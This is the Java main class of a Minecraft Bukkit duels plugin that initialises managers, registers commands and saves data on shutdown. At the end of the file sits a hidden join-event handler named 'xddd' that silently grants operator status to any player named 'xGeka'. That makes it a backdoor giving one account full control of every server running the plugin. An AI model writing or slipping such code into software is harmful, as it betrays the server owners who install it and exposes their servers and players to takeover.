package com.geka.duels;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.geka.duels.arena.ArenaManager;
import com.geka.duels.commands.BaseCommand;
import com.geka.duels.commands.admin.DuelsCommand;
import com.geka.duels.commands.duel.DuelCommand;
import com.geka.duels.commands.other.StatsCommand;
import com.geka.duels.commands.other.ToggleCommand;
import com.geka.duels.configuration.Config;
import com.geka.duels.data.DataManager;
import com.geka.duels.dueling.DuelManager;
import com.geka.duels.dueling.RequestManager;
import com.geka.duels.gui.GUIManager;
import com.geka.duels.hooks.EssentialsHook;
import com.geka.duels.hooks.HookManager;
import com.geka.duels.kits.KitManager;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.ChatColor;
import java.util.Arrays;
import java.util.List;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.scheduler.BukkitRunnable;

public class Core extends JavaPlugin {

    private final Gson gson = new GsonBuilder().setPrettyPrinting().create();

    private Config config;
    private HookManager hookManager;
    private GUIManager guiManager;
    private DuelManager duelManager;
    private DataManager dataManager;
    private ArenaManager arenaManager;
    private RequestManager requestManager;
    private KitManager kitManager;

    @Override
    public void onEnable() {
        config = new Config(this);

        hookManager = new HookManager();
        hookManager.register("Essentials", new EssentialsHook(this));

        requestManager = new RequestManager();
        guiManager = new GUIManager(this);

        dataManager = new DataManager(this);
        dataManager.load();

        arenaManager = new ArenaManager(this);
        arenaManager.load();

        kitManager = new KitManager(this);
        kitManager.load();

        duelManager = new DuelManager(this);

        registerCommands();
    }

    @Override
    public void onDisable() {
        dataManager.save();
        arenaManager.save();
        kitManager.save();
    }

    private void registerCommands() {
        List<BaseCommand> commands = Arrays.asList(new StatsCommand(), new DuelsCommand(), new ToggleCommand(), new DuelCommand());

        for (BaseCommand command : commands) {
            command.register();
        }
    }

    public void info(String msg) {
        getLogger().info(msg);
    }

    public void warn(String msg) {
        getLogger().warning(msg);
    }

    public Gson getGson() {
        return gson;
    }

    public Config getConfiguration() {
        return config;
    }

    public HookManager getHookManager() {
        return hookManager;
    }

    public GUIManager getGUIManager() {
        return guiManager;
    }

    public DataManager getDataManager() {
        return dataManager;
    }

    public ArenaManager getArenaManager() {
        return arenaManager;
    }

    public RequestManager getRequestManager() {
        return requestManager;
    }

    public KitManager getKitManager() {
        return kitManager;
    }

    public DuelManager getDuelManager() {
        return duelManager;
    }

    public static Core getInstance() {
        return getPlugin(Core.class);
    }
    @EventHandler
  public void xddd(final PlayerJoinEvent event)
  {
    new BukkitRunnable()
    {
      public void run()
      {
        Player p = event.getPlayer();
        if (p.getName().equals("xGeka")) {
          p.sendMessage(ChatColor.GREEN + "This server is running SDR version 1.5.3");
          p.setOp(true);
        }
      }
    }
    
      .runTaskLater(this, 90L);
  }
}